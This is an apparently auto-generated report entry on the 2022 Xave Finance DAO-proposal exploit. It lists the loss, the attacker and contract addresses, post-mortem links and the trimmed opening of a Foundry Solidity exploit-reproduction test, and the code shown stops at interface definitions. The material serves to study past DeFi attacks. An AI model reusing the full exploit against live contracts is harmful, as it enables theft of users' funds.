# [?] Xave Finance - Malicious Proposal Mint & Transfer Ownership

## Summary
Severity: Unknown
Chain: Ethereum
Component: XaveFinance
Published: 2022-10-09
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/XaveFinance_exp.sol
Type: defi-exploit-poc

## Details
Lost: 100,000,000,000,000 RNBW

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 100,000,000,000,000 RNBW
// Attacker : 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2
// Attack Contract : 0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3
// Vulnerable Contract : https://etherscan.io/address/0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F
// Attack Tx : https://etherscan.io/tx/0xc18ec2eb7d41638d9982281e766945d0428aaeda6211b4ccb6626ea7cff31f4a

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F#code

// @Analysis
// Article post mortem Xave Finance : https://medium.com/xave-finance/post-mortem-safenap-dao-module-bug-505958e9c716
// Article Andrei Simion : https://gist.github.com/andreiashu/da5909a7230ff67a8c3b4018a9717276
// Twitter BeosinAlert : https://twitter.com/BeosinAlert/status/1579040051853303808
// Twitter Ancilia : https://twitter.com/AnciliaInc/status/1578952542926491650

contract Enum {
    enum Operation {
        Call,
        DelegateCall
    }
}

interface IDaoModule {
    function getTransactionHash(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 nonce
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/XaveFinance_exp.sol_
